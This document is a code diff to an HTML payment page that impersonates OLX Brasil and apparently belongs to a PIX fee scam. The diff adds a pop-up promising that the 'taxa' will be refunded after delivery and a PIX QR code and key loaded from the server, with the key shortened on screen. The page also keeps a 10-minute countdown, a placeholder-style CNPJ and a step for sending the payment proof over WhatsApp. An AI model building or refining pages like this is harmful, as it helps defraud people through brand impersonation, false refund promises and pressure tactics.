@@ -113,6 +113,11 @@
             margin-top: 15px;
         }
 
+        /* Estilo para chave PIX encurtada */
+        .chave-pix .chave-encurtada {
+            display: block;
+        }
+
         .pagamento-info {
             display: flex;
             align-items: center;
@@ -377,10 +382,80 @@
             margin: 20px 0;
             display: none;
         }
+
+        /* Estilo para o indicador de carregamento do QR Code */
+        .qrcode-loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .qrcode-loader i {
+            font-size: 40px;
+            color: #6e0ad6;
+            margin-bottom: 15px;
+        }
+
+        /* Estilos para o modal de aviso */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .modal-message {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .btn-prosseguir {
+            background-color: #F26825;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: bold;
+        }
+
+        .btn-prosseguir:hover {
+            background-color: #d55a1e;
+        }
     </style>
 </head>
 
 <body>
+    <!-- Modal de aviso -->
+    <div id="aviso-modal" class="modal-overlay">
+        <div class="modal-content">
+            <p class="modal-message">A taxa será reembolsada automaticamente após a entrega. O valor total será reservado em sua conta!</p>
+            <button id="btn-prosseguir" class="btn-prosseguir">Prosseguir</button>
+        </div>
+    </div>
+
     <div class="app-container">
         <div class="header-content">
             <div class="logo">
@@ -399,7 +474,7 @@
                 </div>
                 <div class="pagamento-valor">
                     <h3>Valor a pagar</h3>
-                    <div class="valor">R$ 242,00</div>
+                    <div class="valor" id="valor-pagamento">Carregando...</div>
                 </div>
 
                 <!-- Timer de contagem regressiva -->
@@ -419,11 +494,15 @@
 
                 <div class="pagamento-pix">
                     <p>Escaneie o QR code abaixo com o aplicativo do seu banco ou copie a chave PIX</p>
-                    <div class="qrcode-container">
-                        <img src="/images/pix-qrcode.png" alt="QR Code do PIX">
+                    <div class="qrcode-container" id="qrcode-container">
+                        <div class="qrcode-loader" id="qrcode-loader">
+                            <i class="fas fa-sync fa-spin"></i>
+                            <p>Gerando QR Code PIX...</p>
+                        </div>
+                        <img src="/images/pix-qrcode.png" alt="QR Code do PIX" id="qrcode-img" style="display: none;">
                     </div>
                     <p><strong>Ou use a chave PIX abaixo:</strong></p>
-                    <div class="chave-pix" id="chave-pix">a707e498-744f-45ff-ad40-eee53ba86815</div>
+                    <div class="chave-pix" id="chave-pix">Carregando chave PIX...</div>
                     <button class="btn-copiar" id="btn-copiar-pix">
                         <i class="far fa-copy"></i> Copiar Chave PIX
                     </button>
@@ -465,7 +544,7 @@
                     </div>
                 </div>
                 <div class="footer-bottom">
-                    <p>© 2025 OLX Brasil - Todos os direitos reservados</p>
+                    <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
                     <p>CNPJ: 10.000.000/0001-00 - Avenida Paulista, 1000 - São Paulo/SP</p>
                 </div>
             </div>
@@ -474,7 +553,43 @@
                 <p>Carregando...</p>
             </div>
             <script>
+                // Variável global para armazenar o preço
+                let precoConfig = "0,00"; // Valor padrão caso falhe o carregamento
+                
+                // Função para carregar o preço do config.json
+                function carregarPreco() {
+                    return fetch('/config.json')
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Não foi possível carregar o arquivo config.json');
+                            }
+                            return response.json();
+                        })
+                        .then(config => {
+                            if (config && config.preco) {
+                                // Formatar o preço para o padrão brasileiro (com vírgula)
+                                precoConfig = config.preco.replace('.', ',');
+                                
+                                // Atualizar o valor na interface
+                                document.getElementById('valor-pagamento').textContent = `R$ ${precoConfig}`;
+                                console.log('Preço carregado com sucesso:', precoConfig);
+                                return precoConfig;
+                            } else {
+                                throw new Error('Formato do config.json inválido');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Erro ao carregar o preço:', error);
+                            precoConfig = "242,00"; // Valor padrão em caso de erro
+                            document.getElementById('valor-pagamento').textContent = `R$ ${precoConfig}`;
+                            return precoConfig;
+                        });
+                }
+                
                 document.addEventListener('DOMContentLoaded', function () {
+                    // Carregar o preço do config.json
+                    carregarPreco();
+                    
                     const btnCopiarPix = document.getElementById('btn-copiar-pix');
                     const chavePix = document.getElementById('chave-pix');
                     const btnConfirmarPagamento = document.getElementById('btn-confirmar-pagamento');
@@ -482,13 +597,34 @@
                     const comprovanteUpload = document.getElementById('comprovante-upload');
                     const arquivoSelecionado = document.getElementById('arquivo-selecionado');
                     const btnEnviarComprovante = document.getElementById('btn-enviar-comprovante');
-                    const btnWhatsapp = document.getElementById('btn-whatsapp');
                     const loadingOverlay = document.getElementById('loading-overlay');
+                    const qrcodeImg = document.getElementById('qrcode-img');
+                    const qrcodeLoader = document.getElementById('qrcode-loader');
+                    
+                    // Modal de aviso
+                    const avisoModal = document.getElementById('aviso-modal');
+                    const btnProsseguir = document.getElementById('btn-prosseguir');
+                    
+                    // Exibe o modal ao carregar a página
+                    avisoModal.style.display = 'flex';
+                    
+                    // Fecha o modal ao clicar no botão
+                    btnProsseguir.addEventListener('click', function() {
+                        avisoModal.style.display = 'none';
+                    });
+                    
+                    // Variável para armazenar a chave PIX completa
+                    let chavePixCompleta = '';
 
+                    // Função para encurtar a chave PIX na exibição
+                    function encurtarChavePix(chave) {
+                        if (chave.length <= 12) return chave; // Não encurta chaves curtas
+                        return `${chave.substring(0, 5)}...${chave.substring(chave.length - 5)}`;
+                    }
+                    
                     // Configuração do timer de pagamento
                     const paymentTimer = document.getElementById('payment-timer');
                     const timerExpirado = document.getElementById('timer-expirado');
-                    const btnRenovarPagamento = document.getElementById('btn-renovar-pagamento');
                     let tempoRestante = 10 * 60; // 10 minutos em segundos
                     let timerInterval;
 
@@ -508,27 +644,79 @@
                         tempoRestante--;
                     }
 
-                    // Iniciar o timer
-                    timerInterval = setInterval(atualizarTimer, 1000);
-                    atualizarTimer(); // Chamar imediatamente para evitar atraso na exibição
+                    // Não iniciar o timer aqui - será iniciado apenas após o QR Code ser gerado
 
                     // Botão para renovar o pagamento
-                    btnRenovarPagamento.addEventListener('click', function () {
-                        tempoRestante = 10 * 60; // Reiniciar para 10 minutos
-                        document.querySelector('.pagamento-pix').style.display = 'block';
-                        timerExpirado.style.display = 'none';
-                        paymentTimer.parentElement.style.display = 'block';
+                    const btnRenovarPagamento = document.getElementById('btn-renovar-pagamento');
+                    if (btnRenovarPagamento) {
+                        btnRenovarPagamento.addEventListener('click', function() {
+                            // Restaurar exibição do QR Code
+                            qrcodeImg.style.display = 'none';
+                            qrcodeLoader.style.display = 'flex';
+                            chavePix.textContent = 'Carregando chave PIX...';
+                            
+                            // Recarregar o QR Code
+                            carregarQRCodePix();
+                            
+                            // Reiniciar o timer - isso será feito após o carregamento bem-sucedido do QR Code
+                            clearInterval(timerInterval);
+                            tempoRestante = 10 * 60; // Reiniciar para 10 minutos
+                            document.querySelector('.pagamento-pix').style.display = 'block';
+                            timerExpirado.style.display = 'none';
+                            paymentTimer.parentElement.style.display = 'block';
+                            // O timer será iniciado pela função carregarQRCodePix quando o QR Code for gerado
+                        });
+                    }
 
-                        // Reiniciar o timer
-                        clearInterval(timerInterval);
-                        timerInterval = setInterval(atualizarTimer, 1000);
-                        atualizarTimer();
-                    });
+                    // Carregar QR Code e chave PIX
+                    carregarQRCodePix();
+
+                    // Função para carregar QR Code e chave PIX do servidor
+                    function carregarQRCodePix() {
+                        fetch('/api/gerar-qrcode-pix')
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Erro ao carregar QR Code PIX');
+                                }
+                                return response.json();
+                            })
+                            .then(data => {
+                                if (data.success) {
+                                    // Exibir o QR Code
+                                    qrcodeLoader.style.display = 'none';
+                                    qrcodeImg.src = data.qrCodeBase64;
+                                    qrcodeImg.style.display = 'block';
+                                    
+                                    // Armazenar e exibir a chave PIX
+                                    if (data.pixTitle) {
+                                        chavePixCompleta = data.pixTitle;
+                                        chavePix.textContent = encurtarChavePix(data.pixTitle);
+                                    }
+                                    
+                                    // Iniciar o timer apenas após o QR Code ser carregado com sucesso
+                                    clearInterval(timerInterval); // Limpar qualquer timer existente
+                                    tempoRestante = 10 * 60; // Garantir que começa de 10 minutos
+                                    timerInterval = setInterval(atualizarTimer, 1000);
+                                    atualizarTimer(); // Chamar imediatamente para exibir o valor inicial
+                                } else {
+                                    throw new Error(data.message || 'Erro ao carregar QR Code');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Erro:', error);
+                                qrcodeLoader.innerHTML = `
+                                    <i class="fas fa-exclamation-triangle" style="color: #e65c00;"></i>
+                                    <p>Erro ao carregar QR Code PIX. Tente novamente mais tarde.</p>
+                                `;
+                                chavePix.textContent = "Não foi possível carregar a chave PIX";
+                            });
+                    }
 
                     // Botão para copiar a chave PIX
                     btnCopiarPix.addEventListener('click', function () {
                         const textArea = document.createElement('textarea');
-                        textArea.value = chavePix.textContent;
+                        // Usar a chave completa para cópia, não a versão encurtada
+                        textArea.value = chavePixCompleta || chavePix.textContent;
                         document.body.appendChild(textArea);
                         textArea.select();
                         document.execCommand('copy');
@@ -539,7 +727,7 @@
                             this.innerHTML = '<i class="far fa-copy"></i> Copiar Chave PIX';
                         }, 2000);
                     });
-
+        
                     // Botão para confirmar pagamento
                     btnConfirmarPagamento.addEventListener('click', function () {
                         comprovanteSection.style.display = 'block';
@@ -590,8 +778,8 @@
                         const file = comprovanteUpload.files[0];
                         const formData = new FormData();
                         formData.append('comprovante', file);
-                        formData.append('chavePix', chavePix.textContent);
-                        formData.append('valor', '242,00');
+                        formData.append('chavePix', chavePixCompleta || chavePix.textContent);
+                        formData.append('valor', precoConfig); // Usar o preço dinâmico
 
                         // Mostrar overlay de carregamento
                         loadingOverlay.style.display = 'flex';
@@ -638,7 +826,7 @@
                         // Criar mensagem personalizada com dados do pagamento
                         const message = `*COMPROVANTE DE PAGAMENTO*\n\n` +
                             `*Chave PIX*: ${pixKey}\n` +
-                            `*Valor*: R$ 242,00\n\n` +
+                            `*Valor*: R$ ${precoConfig}\n\n` +
                             `Estou enviando o comprovante de pagamento conforme solicitado.`;
 
                         // Criar URL do WhatsApp com a mensagem predefinida
